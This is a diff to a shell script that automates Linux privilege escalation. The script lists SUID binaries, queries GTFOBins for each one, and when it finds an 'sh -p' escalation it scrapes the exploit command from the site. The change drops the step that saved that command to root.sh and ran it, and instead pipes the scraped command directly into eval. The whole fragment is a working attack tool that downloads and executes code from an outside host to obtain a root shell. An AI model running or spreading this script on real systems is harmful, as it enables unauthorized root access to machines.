@@ -14,10 +14,8 @@ find / -perm -4000 -type f 2>/dev/null | sed 's:.*/::' | (while read s; do
         shCount=$(curl --silent https://gtfobins.github.io/gtfobins/$i/ | grep -c -i "sh -p")
         if [ "$shCount" == 2 ] 
         then
-            curl --silent https://gtfobins.github.io/gtfobins/$i/ | grep -i "\./$i" | awk -F "</code>" '{print $1}' | cut -d "/" -f2-  > root.sh
             echo "Identified that" $i "is exploitable"
+            eval $(curl --silent https://gtfobins.github.io/gtfobins/$i/ | grep -i "\./$i" | awk -F "</code>" '{print $1}' | cut -d "/" -f2-)
             break
         fi
         done;
-chmod +x root.sh
-bash root.sh
